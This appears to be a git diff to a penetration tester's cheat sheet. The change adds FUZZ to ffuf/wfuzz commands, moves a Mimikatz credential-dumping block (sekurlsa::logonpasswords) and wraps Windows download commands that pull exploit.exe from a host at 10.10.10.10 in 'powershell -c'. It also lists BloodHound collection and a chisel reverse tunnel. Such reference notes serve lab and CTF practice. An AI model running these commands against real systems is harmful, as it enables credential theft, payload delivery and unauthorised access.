@@ -27,9 +27,9 @@ The following are the commands I use
 
 `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/`
 
-`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/`
+`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/FUZZ`
 
-`wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/`
+`wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/FUZZ`
 
 #### Subdomain
 
@@ -117,6 +117,14 @@ SharpHound powershell
 
 `Invoke-Bloodhound -CollectionMethod All -Domain [domain] -ZipFileName collection.zip`
 
+### Mimikatz
+
+`elevate::token`
+
+`privilege::debug`
+
+`sekurlsa::logonpasswords`
+
 ## Tunnelling/Port forwarding
 
 ### SSH
@@ -132,14 +140,6 @@ SharpHound powershell
 On attacker machine `chisel server --reverse --port 9999`
 
 On target machine `./chisel client 10.10.10.10:9999 R:8080:localhost:8080`
-
-### Mimikatz
-
-`elevate::token`
-
-`privilege::debug`
-
-`sekurlsa::logonpasswords`
 
 ## File transfer
 
@@ -177,15 +177,17 @@ Setup an HTTP server with `sudo python3 -m http.server 80`
 
 `certutil -urlcache -f http://10.10.10.10/file .\file`
 
-`(New-Object Net.WebClient).DownloadFile("http://10.10.10.10/file","C:\Windows\Temp\file")`
+`powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.10.10/file","C:\Windows\Temp\file")`
 
-`Invoke-WebRequest "http://10.10.10.10/exploit.exe" -OutFile "exploit.exe"`
+`powershell -c Invoke-WebRequest "http://10.10.10.10/exploit.exe" -OutFile "exploit.exe"`
 
-`wget "http://10.10.10.10/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"`
+`powershell -c wget "http://10.10.10.10/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"`
 
 <!-- ```bash
 certipy find -u user -p password --dc-ip 10.10.10.10 -stdout -vulnerable
 ``` -->
+
+Impact-Site-Verification: b975e8a6-3f75-4d49-aa65-17c7f42b29d2
 
 ## Aliases
 
